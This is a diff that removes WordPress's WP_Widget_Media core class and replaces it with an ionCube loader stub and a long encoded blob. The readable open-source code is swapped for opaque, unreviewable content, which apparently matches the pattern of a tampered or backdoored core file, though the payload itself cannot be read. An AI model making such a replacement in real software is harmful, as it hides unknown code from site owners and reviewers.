@@ -1,444 +1,206 @@
-<?php
-/**
- * Widget API: WP_Media_Widget class
- *
- * @package WordPress
- * @subpackage Widgets
- * @since 4.8.0
- */
-
-/**
- * Core class that implements a media widget.
- *
- * @since 4.8.0
- *
- * @see WP_Widget
- */
-abstract class WP_Widget_Media extends WP_Widget {
-
-	/**
-	 * Translation labels.
-	 *
-	 * @since 4.8.0
-	 * @var array
-	 */
-	public $l10n = array(
-		'add_to_widget' => '',
-		'replace_media' => '',
-		'edit_media' => '',
-		'media_library_state_multi' => '',
-		'media_library_state_single' => '',
-		'missing_attachment' => '',
-		'no_media_selected' => '',
-		'add_media' => '',
-	);
-
-	/**
-	 * Whether or not the widget has been registered yet.
-	 *
-	 * @since 4.8.1
-	 * @var bool
-	 */
-	protected $registered = false;
-
-	/**
-	 * Constructor.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param string $id_base         Base ID for the widget, lowercase and unique.
-	 * @param string $name            Name for the widget displayed on the configuration page.
-	 * @param array  $widget_options  Optional. Widget options. See wp_register_sidebar_widget() for
-	 *                                information on accepted arguments. Default empty array.
-	 * @param array  $control_options Optional. Widget control options. See wp_register_widget_control()
-	 *                                for information on accepted arguments. Default empty array.
-	 */
-	public function __construct( $id_base, $name, $widget_options = array(), $control_options = array() ) {
-		$widget_opts = wp_parse_args( $widget_options, array(
-			'description' => __( 'A media item.' ),
-			'customize_selective_refresh' => true,
-			'mime_type' => '',
-		) );
-
-		$control_opts = wp_parse_args( $control_options, array() );
-
-		$l10n_defaults = array(
-			'no_media_selected' => __( 'No media selected' ),
-			'add_media' => _x( 'Add Media', 'label for button in the media widget' ),
-			'replace_media' => _x( 'Replace Media', 'label for button in the media widget; should preferably not be longer than ~13 characters long' ),
-			'edit_media' => _x( 'Edit Media', 'label for button in the media widget; should preferably not be longer than ~13 characters long' ),
-			'add_to_widget' => __( 'Add to Widget' ),
-			'missing_attachment' => sprintf(
-				/* translators: %s: URL to media library */
-				__( 'We can&#8217;t find that file. Check your <a href="%s">media library</a> and make sure it wasn&#8217;t deleted.' ),
-				esc_url( admin_url( 'upload.php' ) )
-			),
-			/* translators: %d: widget count */
-			'media_library_state_multi' => _n_noop( 'Media Widget (%d)', 'Media Widget (%d)' ),
-			'media_library_state_single' => __( 'Media Widget' ),
-			'unsupported_file_type' => __( 'Looks like this isn&#8217;t the correct kind of file. Please link to an appropriate file instead.' ),
-		);
-		$this->l10n = array_merge( $l10n_defaults, array_filter( $this->l10n ) );
-
-		parent::__construct(
-			$id_base,
-			$name,
-			$widget_opts,
-			$control_opts
-		);
-	}
-
-	/**
-	 * Add hooks while registering all widget instances of this widget class.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param integer $number Optional. The unique order number of this widget instance
-	 *                        compared to other instances of the same class. Default -1.
-	 */
-	public function _register_one( $number = -1 ) {
-		parent::_register_one( $number );
-		if ( $this->registered ) {
-			return;
-		}
-		$this->registered = true;
-
-		// Note that the widgets component in the customizer will also do the 'admin_print_scripts-widgets.php' action in WP_Customize_Widgets::print_scripts().
-		add_action( 'admin_print_scripts-widgets.php', array( $this, 'enqueue_admin_scripts' ) );
-
-		if ( $this->is_preview() ) {
-			add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_preview_scripts' ) );
-		}
-
-		// Note that the widgets component in the customizer will also do the 'admin_footer-widgets.php' action in WP_Customize_Widgets::print_footer_scripts().
-		add_action( 'admin_footer-widgets.php', array( $this, 'render_control_template_scripts' ) );
-
-		add_filter( 'display_media_states', array( $this, 'display_media_state' ), 10, 2 );
-	}
-
-	/**
-	 * Get schema for properties of a widget instance (item).
-	 *
-	 * @since  4.8.0
-	 *
-	 * @see WP_REST_Controller::get_item_schema()
-	 * @see WP_REST_Controller::get_additional_fields()
-	 * @link https://core.trac.wordpress.org/ticket/35574
-	 * @return array Schema for properties.
-	 */
-	public function get_instance_schema() {
-		$schema = array(
-			'attachment_id' => array(
-				'type' => 'integer',
-				'default' => 0,
-				'minimum' => 0,
-				'description' => __( 'Attachment post ID' ),
-				'media_prop' => 'id',
-			),
-			'url' => array(
-				'type' => 'string',
-				'default' => '',
-				'format' => 'uri',
-				'description' => __( 'URL to the media file' ),
-			),
-			'title' => array(
-				'type' => 'string',
-				'default' => '',
-				'sanitize_callback' => 'sanitize_text_field',
-				'description' => __( 'Title for the widget' ),
-				'should_preview_update' => false,
-			),
-		);
-
-		/**
-		 * Filters the media widget instance schema to add additional properties.
-		 *
-		 * @since 4.9.0
-		 *
-		 * @param array           $schema Instance schema.
-		 * @param WP_Widget_Media $this   Widget object.
-		 */
-		$schema = apply_filters( "widget_{$this->id_base}_instance_schema", $schema, $this );
-
-		return $schema;
-	}
-
-	/**
-	 * Determine if the supplied attachment is for a valid attachment post with the specified MIME type.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param int|WP_Post $attachment Attachment post ID or object.
-	 * @param string      $mime_type  MIME type.
-	 * @return bool Is matching MIME type.
-	 */
-	public function is_attachment_with_mime_type( $attachment, $mime_type ) {
-		if ( empty( $attachment ) ) {
-			return false;
-		}
-		$attachment = get_post( $attachment );
-		if ( ! $attachment ) {
-			return false;
-		}
-		if ( 'attachment' !== $attachment->post_type ) {
-			return false;
-		}
-		return wp_attachment_is( $mime_type, $attachment );
-	}
-
-	/**
-	 * Sanitize a token list string, such as used in HTML rel and class attributes.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @link http://w3c.github.io/html/infrastructure.html#space-separated-tokens
-	 * @link https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList
-	 * @param string|array $tokens List of tokens separated by spaces, or an array of tokens.
-	 * @return string Sanitized token string list.
-	 */
-	public function sanitize_token_list( $tokens ) {
-		if ( is_string( $tokens ) ) {
-			$tokens = preg_split( '/\s+/', trim( $tokens ) );
-		}
-		$tokens = array_map( 'sanitize_html_class', $tokens );
-		$tokens = array_filter( $tokens );
-		return join( ' ', $tokens );
-	}
-
-	/**
-	 * Displays the widget on the front-end.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @see WP_Widget::widget()
-	 *
-	 * @param array $args     Display arguments including before_title, after_title, before_widget, and after_widget.
-	 * @param array $instance Saved setting from the database.
-	 */
-	public function widget( $args, $instance ) {
-		$instance = wp_parse_args( $instance, wp_list_pluck( $this->get_instance_schema(), 'default' ) );
-
-		// Short-circuit if no media is selected.
-		if ( ! $this->has_content( $instance ) ) {
-			return;
-		}
-
-		echo $args['before_widget'];
-
-		/** This filter is documented in wp-includes/widgets/class-wp-widget-pages.php */
-		$title = apply_filters( 'widget_title', $instance['title'], $instance, $this->id_base );
-
-		if ( $title ) {
-			echo $args['before_title'] . $title . $args['after_title'];
-		}
-
-		/**
-		 * Filters the media widget instance prior to rendering the media.
-		 *
-		 * @since 4.8.0
-		 *
-		 * @param array           $instance Instance data.
-		 * @param array           $args     Widget args.
-		 * @param WP_Widget_Media $this     Widget object.
-		 */
-		$instance = apply_filters( "widget_{$this->id_base}_instance", $instance, $args, $this );
-
-		$this->render_media( $instance );
-
-		echo $args['after_widget'];
-	}
-
-	/**
-	 * Sanitizes the widget form values as they are saved.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @see WP_Widget::update()
-	 * @see WP_REST_Request::has_valid_params()
-	 * @see WP_REST_Request::sanitize_params()
-	 *
-	 * @param array $new_instance Values just sent to be saved.
-	 * @param array $instance     Previously saved values from database.
-	 * @return array Updated safe values to be saved.
-	 */
-	public function update( $new_instance, $instance ) {
-
-		$schema = $this->get_instance_schema();
-		foreach ( $schema as $field => $field_schema ) {
-			if ( ! array_key_exists( $field, $new_instance ) ) {
-				continue;
-			}
-			$value = $new_instance[ $field ];
-
-			// Workaround for rest_validate_value_from_schema() due to the fact that rest_is_boolean( '' ) === false, while rest_is_boolean( '1' ) is true.
-			if ( 'boolean' === $field_schema['type'] && '' === $value ) {
-				$value = false;
-			}
-
-			if ( true !== rest_validate_value_from_schema( $value, $field_schema, $field ) ) {
-				continue;
-			}
-
-			$value = rest_sanitize_value_from_schema( $value, $field_schema );
-
-			// @codeCoverageIgnoreStart
-			if ( is_wp_error( $value ) ) {
-				continue; // Handle case when rest_sanitize_value_from_schema() ever returns WP_Error as its phpdoc @return tag indicates.
-			}
-
-			// @codeCoverageIgnoreEnd
-			if ( isset( $field_schema['sanitize_callback'] ) ) {
-				$value = call_user_func( $field_schema['sanitize_callback'], $value );
-			}
-			if ( is_wp_error( $value ) ) {
-				continue;
-			}
-			$instance[ $field ] = $value;
-		}
-
-		return $instance;
-	}
-
-	/**
-	 * Render the media on the frontend.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param array $instance Widget instance props.
-	 * @return string
-	 */
-	abstract public function render_media( $instance );
-
-	/**
-	 * Outputs the settings update form.
-	 *
-	 * Note that the widget UI itself is rendered with JavaScript via `MediaWidgetControl#render()`.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @see \WP_Widget_Media::render_control_template_scripts() Where the JS template is located.
-	 * @param array $instance Current settings.
-	 * @return void
-	 */
-	final public function form( $instance ) {
-		$instance_schema = $this->get_instance_schema();
-		$instance = wp_array_slice_assoc(
-			wp_parse_args( (array) $instance, wp_list_pluck( $instance_schema, 'default' ) ),
-			array_keys( $instance_schema )
-		);
-
-		foreach ( $instance as $name => $value ) : ?>
-			<input
-				type="hidden"
-				data-property="<?php echo esc_attr( $name ); ?>"
-				class="media-widget-instance-property"
-				name="<?php echo esc_attr( $this->get_field_name( $name ) ); ?>"
-				id="<?php echo esc_attr( $this->get_field_id( $name ) ); // Needed specifically by wpWidgets.appendTitle(). ?>"
-				value="<?php echo esc_attr( is_array( $value ) ? join( ',', $value ) : strval( $value ) ); ?>"
-			/>
-		<?php
-		endforeach;
-	}
-
-	/**
-	 * Filters the default media display states for items in the Media list table.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param array   $states An array of media states.
-	 * @param WP_Post $post   The current attachment object.
-	 * @return array
-	 */
-	public function display_media_state( $states, $post = null ) {
-		if ( ! $post ) {
-			$post = get_post();
-		}
-
-		// Count how many times this attachment is used in widgets.
-		$use_count = 0;
-		foreach ( $this->get_settings() as $instance ) {
-			if ( isset( $instance['attachment_id'] ) && $instance['attachment_id'] === $post->ID ) {
-				$use_count++;
-			}
-		}
-
-		if ( 1 === $use_count ) {
-			$states[] = $this->l10n['media_library_state_single'];
-		} elseif ( $use_count > 0 ) {
-			$states[] = sprintf( translate_nooped_plural( $this->l10n['media_library_state_multi'], $use_count ), number_format_i18n( $use_count ) );
-		}
-
-		return $states;
-	}
-
-	/**
-	 * Enqueue preview scripts.
-	 *
-	 * These scripts normally are enqueued just-in-time when a widget is rendered.
-	 * In the customizer, however, widgets can be dynamically added and rendered via
-	 * selective refresh, and so it is important to unconditionally enqueue them in
-	 * case a widget does get added.
-	 *
-	 * @since 4.8.0
-	 */
-	public function enqueue_preview_scripts() {}
-
-	/**
-	 * Loads the required scripts and styles for the widget control.
-	 *
-	 * @since 4.8.0
-	 */
-	public function enqueue_admin_scripts() {
-		wp_enqueue_media();
-		wp_enqueue_script( 'media-widgets' );
-	}
-
-	/**
-	 * Render form template scripts.
-	 *
-	 * @since 4.8.0
-	 */
-	public function render_control_template_scripts() {
-		?>
-		<script type="text/html" id="tmpl-widget-media-<?php echo esc_attr( $this->id_base ); ?>-control">
-			<# var elementIdPrefix = 'el' + String( Math.random() ) + '_' #>
-			<p>
-				<label for="{{ elementIdPrefix }}title"><?php esc_html_e( 'Title:' ); ?></label>
-				<input id="{{ elementIdPrefix }}title" type="text" class="widefat title">
-			</p>
-			<div class="media-widget-preview <?php echo esc_attr( $this->id_base ); ?>">
-				<div class="attachment-media-view">
-					<div class="placeholder"><?php echo esc_html( $this->l10n['no_media_selected'] ); ?></div>
-				</div>
-			</div>
-			<p class="media-widget-buttons">
-				<button type="button" class="button edit-media selected">
-					<?php echo esc_html( $this->l10n['edit_media'] ); ?>
-				</button>
-			<?php if ( ! empty( $this->l10n['replace_media'] ) ) : ?>
-				<button type="button" class="button change-media select-media selected">
-					<?php echo esc_html( $this->l10n['replace_media'] ); ?>
-				</button>
-			<?php endif; ?>
-				<button type="button" class="button select-media not-selected">
-					<?php echo esc_html( $this->l10n['add_media'] ); ?>
-				</button>
-			</p>
-			<div class="media-widget-fields">
-			</div>
-		</script>
-		<?php
-	}
-
-	/**
-	 * Whether the widget has content to show.
-	 *
-	 * @since 4.8.0
-	 *
-	 * @param array $instance Widget instance props.
-	 * @return bool Whether widget has content.
-	 */
-	protected function has_content( $instance ) {
-		return ( $instance['attachment_id'] && 'attachment' === get_post_type( $instance['attachment_id'] ) ) || $instance['url'];
-	}
-}
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
